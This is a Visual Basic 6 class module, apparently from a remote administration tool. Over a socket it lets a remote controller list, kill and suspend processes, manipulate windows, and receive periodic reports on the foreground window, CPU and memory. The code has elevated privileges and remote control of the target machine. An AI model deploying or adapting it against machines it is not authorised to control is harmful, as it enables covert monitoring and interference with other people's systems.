VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsProcess"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit


Public ID_Connection            As Long
Private m_Data                  As String
Private m_UsageCPU              As Long
Private m_FreeMemory            As Long
Private m_ProcessCount          As Long
Private m_WindowsCount           As Long
Private m_ForeGroundWindow       As Long
Private WithEvents Timer1 As cTimer
Attribute Timer1.VB_VarHelpID = -1


Private Sub SendListWindows()
    Dim ArrWin() As Variant
    Dim sData As String
    Dim IconsStream() As Byte
    Dim i As Long
    
    If GetWindowsList(ArrWin) Then
        m_WindowsCount = UBound(ArrWin) + 1
        
        If CreateListImage(ArrWin, IconsStream, True) Then
            WinSock32.SendData ID_Connection, "5" & Delimiter
            WinSock32.SendData ID_Connection, IconsStream
            WinSock32.SendData ID_Connection, END_DATA
        End If
        
    
        For i = 0 To UBound(ArrWin)
            sData = sData & GetWinText(ArrWin(i)) & Delimiter & ArrWin(i) & Delimiter & GetWindowStyle(ArrWin(i)) & Delimiter & GetWindowPID(ArrWin(i)) & vbCrLf
        Next
    End If
    
    WinSock32.SendData ID_Connection, "6" & Delimiter & sData & END_DATA
End Sub


Private Sub SendListProcess()
    Dim tLP() As ProcessInfo
    Dim i As Long
    Dim sData As String
    Dim ListIcon() As Variant
    Dim IconsStream() As Byte
    
    If GetProcessList(tLP) Then
        m_ProcessCount = UBound(tLP) + 1
        
        ReDim ListIcon(UBound(tLP))
        
        For i = 0 To UBound(tLP)
            If tLP(i).FileName <> vbNullString Then
                ListIcon(i) = tLP(i).FileName
            Else
                ListIcon(i) = ".exe"
            End If
        Next
        
        If CreateListImage(ListIcon, IconsStream, False) Then
            WinSock32.SendData ID_Connection, "0" & Delimiter
            WinSock32.SendData ID_Connection, IconsStream
            WinSock32.SendData ID_Connection, END_DATA
        End If
        
        For i = 0 To UBound(tLP) '- 1
            With tLP(i)
            sData = sData & .Name & Delimiter & .PID & Delimiter & .Account & Delimiter & .Memory & Delimiter & .ThreatCount & Delimiter & .FileName & vbCrLf
            End With
        Next
        
        WinSock32.SendData ID_Connection, "1" & Delimiter & sData & END_DATA
        
        
    End If

End Sub

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    Dim vData()     As String
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left(sBuf, lRet2 - 1)
        sBuf = Mid(sBuf, lRet2 + 1)

        Select Case sCommand
                
            Case 0
                SendListProcess
                
            Case 1
                vData = Split(sBuf, Delimiter)
                Call SuspendProcess(vData(0), vData(1))
                
            Case 2
                If KillProcess(sBuf) Then
                    SendListProcess
                Else
                    WinSock32.SendData ID_Connection, "2" & Delimiter & END_DATA
                End If
                
            Case 3
                SendListWindows
                
            Case 4
                WinSock32.SendData ID_Connection, "8" & Delimiter & GetCurrentProcessId & END_DATA
                
            Case 5
                PutFocusWindows sBuf
                
            Case 6
                vData = Split(sBuf, Delimiter)
                SetWindowState vData(0), vData(1)
                
        End Select
                
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(ID, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub


Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    ID_Connection = 0
    Timer1.DestroyTimer
End Sub

Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)

End Sub

Private Sub Class_Initialize()
    AdjustPrivileges
    Set Timer1 = New cTimer
    Timer1.CreateTimer 1000
End Sub

Private Sub Class_Terminate()
    If ID_Connection Then
        WinSock32.WsClose ID_Connection
    End If
    Set Timer1 = Nothing
End Sub

Private Sub Timer1_Timer(ByVal ThisTime As Long)
    Dim lUsageCPU As Long
    Dim lFreeMemory As Long
    Dim lProcessCount As Long
    Dim hForeGroundWindow As Long
    Dim lWindowsCount As Long
    
    hForeGroundWindow = GetForegroundWindow
    If m_ForeGroundWindow <> hForeGroundWindow Then
        m_ForeGroundWindow = hForeGroundWindow
        WinSock32.SendData ID_Connection, "7" & Delimiter & hForeGroundWindow & END_DATA
    End If
    
    lWindowsCount = GetWindowsCount
    If m_WindowsCount <> lWindowsCount Then
        m_WindowsCount = lWindowsCount
        Call SendListWindows
    End If
    
    lUsageCPU = GetUsageCPU
    If m_UsageCPU <> lUsageCPU Then
        m_UsageCPU = lUsageCPU
        WinSock32.SendData ID_Connection, "3" & Delimiter & lUsageCPU & END_DATA
    End If
    
    lFreeMemory = GetFreeMem
    If m_FreeMemory <> lFreeMemory Then
        m_FreeMemory = lFreeMemory
        WinSock32.SendData ID_Connection, "4" & Delimiter & lFreeMemory & END_DATA
    End If
    
    lProcessCount = GetProcessCount
    If m_ProcessCount <> lProcessCount Then
        m_ProcessCount = lProcessCount
        Call SendListProcess
    End If
    

    
End Sub
